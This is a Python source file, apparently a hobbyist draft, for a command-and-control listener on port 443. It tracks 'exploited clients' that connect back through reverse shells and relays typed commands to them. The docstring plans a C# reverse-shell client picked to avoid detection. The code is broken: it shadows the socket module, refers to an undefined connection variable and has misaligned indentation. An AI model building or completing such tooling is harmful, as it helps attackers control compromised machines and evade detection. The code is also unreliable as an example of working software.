'''
A Python WebServer to manage exploited clients
Clients connect over 443 and a revse shell is started

what is the point of using this over a netcat listener???? especially if all we're doing is starting a reverse shell 
this tracks and handles multiple clients connecting to a server through UID assignment

For the client portion:
gonna need a C# revse shell, not using netcat as thats easily detectable
'''

import socket
import uuid

def connect():
	host = 'localhost'
	port = 443


	socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socket.bind((host, port))
	socket.listen()
	clients = []    # Client list
	UIDS = {}		# Unique Identifier list

	try:
		while True:
			client_socket, addr = socket.accept()
			clients.append(client_socket)    # Add client to list on connection

			# Generate random UID for clients to represent them, add it to a dict where UUID is key and IP is value
			for client in clients:
				UIDS[client] = uuid.uuid4()

			#i_manage_clients(clients) # Client management command

			command = raw_input("Shell> ") # User input for reverse shell

	        if 'terminate' in command: # If terminate is entered, close connection
	            conn.send('Terminated')
	            conn.close()
	            break

	        else:
	            conn.send(command) # Otherwise we will send the command to the target
	            print conn.recv(1024) # and print the result that we got back

	except KeyboardInterrupt:
		socket.close()

# def i_manage_clients(clients):  # Function to manage clients
#     for client in clients:		# Should edit this to send to UID, not IP, in case of over lapping IP
#         client.send('hello there, general kenobi') # Clients connect with a NC reverse shell and get this message

def main():
	connect()
main()
